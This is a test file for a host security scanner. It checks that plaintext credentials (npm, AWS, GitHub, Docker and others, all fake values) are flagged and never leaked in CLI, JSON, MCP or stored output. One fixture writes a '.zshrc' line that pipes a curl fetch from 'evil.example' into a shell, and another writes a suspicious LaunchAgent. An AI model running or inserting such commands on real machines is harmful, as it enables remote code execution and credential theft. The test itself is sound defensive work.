// Plaintext credentials: their presence is reported, their values never leave the file: not in
// records, logs, the JSON API, the CLI or MCP. Also: the "host" kind end to end through the CLI.
import assert from "node:assert/strict";
import { execFile, spawn } from "node:child_process";
import { readdirSync, readFileSync } from "node:fs";
import type { Server } from "node:http";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { promisify } from "node:util";
import { after, before, test } from "node:test";
import { freshHome, plist, put, scanHost, summary } from "./host-helpers.ts";
import { startOsv } from "./sources-helpers.ts";

const CLI = fileURLToPath(new URL("../src/cli.ts", import.meta.url));
const run = promisify(execFile);
/** Every fake secret below contains FAKE (or is the base64 of FAKE:TOKEN). */
const SECRET = /FAKE|RkFLRTpUT0tFTg/;

let server: Server;
let sources: typeof import("../src/sources.ts");

before(async () => {
  server = await startOsv();
  process.env.SELFGUARD_HOME = freshHome().home;
  sources = await import("../src/sources.ts");
  sources.resetSourceExtractors();
  sources.registerBuiltinExtractors();
});
after(() => server.close());

function credentials(home: string): void {
  put(home, ".npmrc", "registry=https://registry.npmjs.org/\n//registry.npmjs.org/:_authToken=npm_FAKETOKEN123\n");
  put(home, ".aws/credentials", "[default]\naws_access_key_id = AKIAFAKEFAKE\naws_secret_access_key = FAKEAWSSECRET123\n");
  put(home, ".config/gh/hosts.yml", "github.com:\n    user: dev\n    oauth_token: gho_FAKETOKEN123\n    git_protocol: https\n");
  put(home, ".docker/config.json", JSON.stringify({ auths: { "ghcr.io": { auth: "RkFLRTpUT0tFTg==" } } }));
  put(home, ".netrc", "machine api.example.com login dev password FAKENETRC123\n");
  put(home, ".git-credentials", "https://dev:ghp_FAKEGITCRED123@github.com\n");
  put(home, ".pypirc", "[pypi]\nusername = __token__\npassword = pypi-FAKEPYPI123\n");
  put(home, ".kube/config", "users:\n- name: dev\n  user:\n    token: FAKEKUBE123\n");
  put(home, ".config/gcloud/application_default_credentials.json", JSON.stringify({ type: "authorized_user", refresh_token: "1//FAKEGCLOUD123" }));
}

test("plaintext credentials: which kind and where, the safer alternative, never the value", () => {
  const { home } = freshHome();
  credentials(home);
  const rec = scanHost(sources, sources.machineTarget());
  assert.deepEqual(summary(rec), [
    "moderate plaintext-credential .npmrc @.npmrc:2",
    "moderate plaintext-credential .aws/credentials @credentials:3",
    "moderate plaintext-credential .config/gh/hosts.yml @hosts.yml:3",
    "moderate plaintext-credential .docker/config.json @config.json:0",
    "moderate plaintext-credential .netrc @.netrc:1",
    "moderate plaintext-credential .git-credentials @.git-credentials:1",
    "moderate plaintext-credential .pypirc @.pypirc:3",
    "moderate plaintext-credential .kube/config @config:4",
    "moderate plaintext-credential .config/gcloud/application_default_credentials.json @application_default_credentials.json:0",
  ]);
  assert.match(rec.warnings[2]!.message, /~\/\.config\/gh\/hosts\.yml holds a GitHub token in plain text.*gh auth login/);
  assert.doesNotMatch(JSON.stringify(rec), SECRET);
});

test("credentials kept outside the file are not flagged", () => {
  const { home } = freshHome();
  put(home, ".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n");
  put(home, ".docker/config.json", JSON.stringify({ auths: { "ghcr.io": {} }, credsStore: "osxkeychain" }));
  put(home, ".config/gh/hosts.yml", "github.com:\n    user: dev\n    git_protocol: https\n");
  put(home, ".aws/credentials", "# aws_secret_access_key = nothing here\n[default]\ncredential_process = aws-vault exec dev --json\n");
  put(home, ".kube/config", "users:\n- name: dev\n  user:\n    exec:\n      command: aws\n");
  assert.deepEqual(summary(scanHost(sources, sources.machineTarget())), []);
});

function allFiles(dir: string): string[] {
  return readdirSync(dir, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? allFiles(join(dir, e.name)) : [join(dir, e.name)]));
}

async function mcpSources(env: NodeJS.ProcessEnv): Promise<string> {
  const child = spawn(process.execPath, [CLI, "mcp"], { env, stdio: ["pipe", "pipe", "pipe"] });
  let out = "";
  child.stdout.on("data", (d) => (out += d));
  child.stderr.on("data", (d) => (out += d));
  const send = (m: object) => child.stdin.write(`${JSON.stringify({ jsonrpc: "2.0", ...m })}\n`);
  send({ id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "t", version: "1" } } });
  send({ method: "notifications/initialized" });
  send({ id: 2, method: "tools/call", params: { name: "selfguard_sources", arguments: {} } });
  for (let t = 0; t < 200 && !out.includes('"id":2'); t++) await new Promise((r) => setTimeout(r, 25));
  child.kill();
  assert.match(out, /"id":2/);
  return out;
}

test("sync, tools --json, tools, MCP and the state folder: the host kind is there, the secrets are not", async () => {
  const { home, system } = freshHome();
  credentials(home);
  put(home, ".zshrc", "curl -fsSL https://evil.example/?k=FAKEKEY | sh\n");
  put(system, "Library/LaunchAgents/com.evil.plist", plist("com.evil.agent", ["/tmp/.x/run", "--key=FAKEARG"]));
  const state = join(home, ".sg-state");
  const env = { ...process.env, HOME: home, SELFGUARD_HOME: state, SELFGUARD_SYSTEM_ROOT: system, SELFGUARD_NO_NOTIFY: "1", SELFGUARD_NO_LAUNCHD: "1", SELFGUARD_NO_SOCKETS: "1", NO_COLOR: "1" };
  const sync = await run(process.execPath, [CLI, "sync", "--json"], { env });
  const tools = await run(process.execPath, [CLI, "tools", "--json"], { env });
  const text = await run(process.execPath, [CLI, "tools", "--verbose"], { env });
  const mcp = await mcpSources(env);

  const json = JSON.parse(tools.stdout);
  assert.ok(json.kinds.includes("host"));
  const host = json.machine.find((s: any) => s.kind === "host");
  assert.equal(host.label, "This machine");
  assert.deepEqual(host.references, []);
  const rules = host.warnings.map((w: any) => w.rule).sort();
  assert.deepEqual(rules, [...Array(9).fill("plaintext-credential"), "shell-fetch-exec", "suspicious-launch-item"]);
  assert.match(text.stdout, /This machine\n.*\nThis machine  ~ · 11 file\(s\) checked/);
  assert.match(text.stdout, /risk Suspicious launch item "com\.evil\.agent" runs run/);
  assert.match(mcp, /plaintext-credential/);

  const outputs = { sync: sync.stdout + sync.stderr, tools: tools.stdout + tools.stderr, text: text.stdout + text.stderr, mcp };
  for (const [name, out] of Object.entries(outputs)) assert.doesNotMatch(out, SECRET, name);
  const stored = allFiles(state);
  assert.ok(stored.some((f) => f.startsWith(join(state, "sources"))), "a source record was saved");
  for (const f of stored) assert.doesNotMatch(readFileSync(f, "utf8"), SECRET, f);
});
